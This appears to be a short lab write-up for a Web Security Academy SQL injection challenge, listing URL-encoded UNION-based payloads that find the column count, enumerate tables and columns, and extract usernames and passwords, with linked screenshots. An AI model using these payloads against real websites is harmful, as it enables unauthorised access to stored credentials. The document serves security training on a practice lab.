## Find the number of columns:
+ `'+ORDER+BY+3--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/1c44bf07-d26e-42dd-adac-2a216c3760b7)
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/7178e58f-af94-4679-9b6a-0c3e62ac1690)
## Find out the table names:
+ `'UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/f323c4fa-b44b-4cbf-aded-80fa40861b21)

## find out the column names:
+ `'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_mparsa'-- `
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/6124cbc8-0e55-418d-abf5-ea350c10dd49)

## retrieve the data from the table:
+ `'UNION+SELECT+username_qgqovf,+password_zrdbze+FROM+users_mparsa--`
+ ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/cb603ac0-214a-4063-a762-c14bc040d41e)

